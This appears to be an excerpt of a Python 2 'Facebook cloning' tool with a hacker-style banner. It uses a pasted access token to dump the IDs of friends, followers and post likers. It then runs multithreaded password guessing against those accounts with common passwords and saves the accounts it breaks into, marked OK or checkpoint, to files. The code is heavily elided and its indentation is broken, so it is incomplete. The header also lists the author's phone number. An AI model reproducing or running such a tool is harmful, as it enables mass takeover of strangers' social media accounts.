...
"""%s
 ...
 - author      :  NAZIR KHAN
 - facebook    : AJMAL NAZIR
 - whatsap     : +923025669420
 - github     : github.com/GUSTAH5
 - version     : 1.0
...
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s Checking Token %s'%(M,til,o)),
...
def banner():
	print (''' %s 
%sNAZIRO NAZIRO%s ---FACEBOOK*-*-NAZIR KHAN 
 %sNAZIRO NAZIRO %s----Note*-*-CLONING IS NOT A CRIME ITS 
  %sNAZIRO NAZIRO%s--*-*--JUST WAR AGAINST THE SYSTEM
   %sNAZIRO  NAZIRO%s----*-*----OWNER:)(: TOOR AJMAL
    %sNAZIRO  NAZIRO
     %sNAZIRO NAZIRO
      %sNAZIRO NAZIRO
       %sNAZIRO NAZIRO
 (P,U,M,U,P,U,M,P,M,P,M,P))
...
def masuk():
    ...
    rom = raw_input('\n%s [?] CHOOSE : %s'%(P,K))
    if rom in(""):
    	print("%s [!] CHOOSE AN OPTION STUPID "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] USE A NEW/FRESH TOKEN OK."%(P,M,P))
    	romz = raw_input('%s [?] PAST TOKEN HERE : %s'%(P,K))
        if romz in(""):
        	print("%s [!] TOKEN ASA HOTA HE PAAGAL "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] LOGIN SUCCESSFULL%(H));jeda(2)
        ...
        if nanya in(""):
        	...
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://www.facebook.com/NaZerkhaN521");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] FILL IN CORRECTLY "%(M));exit()
...
def publik(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] TYPE '%sme%s' FOR DUMP UR FREIND LIST"%(P,M,P,H,P))
        ...
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(20000)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] TOTAL IDS :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] SUCCESSFULLY DUMP %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] FILE NAME :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %BACK %s] '%(P,K,P))
        menu()
...
def followers(romz,headers=header):
    ...
    try:
        ...
        for a in z['subscribers']['data']:
            ...
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] SUCCESSFULL DUMP %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] FILE NAME :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %sBACK %s] '%(P,K,P))
        menu()
    except Exception as e:
...
def postingan(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] ID POSTS SHOULD BE PUBLIC"%(P,M,P))
        idt = raw_input(' [*] ENTER ID : %s'%(K))
        simpan = raw_input(' %s[?] NAME OF FILE : %s'%(P,K))
...
class ngentod:
    ...
    def romiy(self):
        try:
            ...
            print '\n%s [!] FILE NOT FOUND'%(M)
            raw_input('\n%s [ %sPRESS ENTER TO BACK %s] '%(P,K,P));menu()
        unikers = raw_input('%s [?] MANUAL PASSWORD CRACK? [Y/T] :%s '%(P,K))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] EX : %spakistan%s 786786 , 123123 '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] SET PASS :%s '%(P,K))
                if pwx == '':
                    print '\n %s[!] ABEE OYEEE '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] PASS SHOULD HAVE 6 CHARACTER'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] METHOD : %s'%(P,K))
                        if ind == '':
                            print("%s [!] FILL IN CORRECTLY "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] NAZIR %sOK%s SAVE IN  >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] AJMALO %sCP %sSAVE IN> %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            ...
                            print '\n %s[%s*%s] NAZIR %sOK%s SAVE IN  >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] AJMAL %sCP %sSAVE IN> %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                            ...
                            print ('\n %s[!] fill correctly'%(M));zona()
                    print '\n%s [ method crack ]\n'%(P)
                    print ' [%s01%s] methode b-api (FAST)'%(K,P)
                    print ' [%s02%s] methode mbasic (NORMAL)'%(K,P)
                    print ' [%s03%s] methode mobile (NORMAL) '%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
                            print '\n%s [ method crack ]\n'%(P)
            ...
            print("%s [!] Fill Correctly"%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(P,K))
        if suuu == '':
            print("%s [!] a "%(M));self.langsung()
        elif suuu in ('1', '01'):
                                        print '\n %s[%s*%s] NAZIR %sOK%s SAVE IN  >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] AJMAL %sCP %sSAVE IN> %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
...
def menu():
    ...
    if unik == '':
        ...
        jalan('\n%s [√] Successfull '%(H));exit()
    else:
        print("%s [!] FAILEd "%(M));jeda(2);menu()
        
def hasill(c):
	if c in[""]:
		print ("%s[%s!%s] Fill correctly"%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			...
			file = raw_input("%s [?] FILE : "%(P));jeda(0.2)
			if file == "":
		...
		print "\n%s [01] save crack ids %sOK "%(P,H)
        print "%s [02] save  %sCP "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
		if rom in['1','01']:
			try:
				...
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total ids : %s%s"%(K,P,H,str(len(oke))))
			...
			try:
				...
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total id : %s%s"%(K,P,K,str(len(cepe))))
...
def igg():
	print ("\n%s [%s!%s] EX : name%s: %Hannan "%(P,M,P,M,K))
	usr_ = raw_input('%s [?] Input name > %s'%(P,K))
	...
	print '\n%s [%s*%s] HANNAN%sOK%s SAVE IN >%s OK.txt'%(P,K,P,H,P,H);jeda(0.2)
	print '%s [%s*%s] HANNAN %sCP %SAVE IN > %sCP.txt\n'%(P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
